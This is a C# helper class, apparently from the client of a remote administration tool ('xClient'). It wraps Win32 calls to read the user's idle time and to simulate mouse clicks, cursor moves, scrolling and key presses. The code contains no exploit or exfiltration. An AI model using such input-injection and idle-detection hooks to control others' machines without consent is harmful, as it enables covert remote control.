using System.Drawing;
using System.Runtime.InteropServices;
using xClient.Core.Utilities;

namespace xClient.Core.Helper
{
    public static class NativeMethodsHelper
    {
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint MOUSEEVENTF_WHEEL = 0x0800;
        private const uint KEYEVENTF_KEYDOWN = 0x0000;
        private const uint KEYEVENTF_KEYUP = 0x0002;

        public static uint GetLastInputInfoTickCount()
        {
            NativeMethods.LASTINPUTINFO lastInputInfo = new NativeMethods.LASTINPUTINFO();
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
            lastInputInfo.dwTime = 0;

            return NativeMethods.GetLastInputInfo(ref lastInputInfo) ? lastInputInfo.dwTime : 0;
        }

        public static void DoMouseLeftClick(Point p, bool isMouseDown)
        {
            NativeMethods.mouse_event(isMouseDown ? MOUSEEVENTF_LEFTDOWN : MOUSEEVENTF_LEFTUP, p.X, p.Y, 0, 0);
        }

        public static void DoMouseRightClick(Point p, bool isMouseDown)
        {
            NativeMethods.mouse_event(isMouseDown ? MOUSEEVENTF_RIGHTDOWN : MOUSEEVENTF_RIGHTUP, p.X, p.Y, 0, 0);
        }

        public static void DoMouseMove(Point p)
        {
            NativeMethods.SetCursorPos(p.X, p.Y);
        }

        public static void DoMouseScroll(Point p, bool scrollDown)
        {
            NativeMethods.mouse_event(MOUSEEVENTF_WHEEL, p.X, p.Y, scrollDown ? -120 : 120, 0);
        }

        public static void DoKeyPress(byte key, bool keyDown)
        {
            NativeMethods.keybd_event(key, 0, keyDown ? KEYEVENTF_KEYDOWN : KEYEVENTF_KEYUP, 0);
        }
    }
}
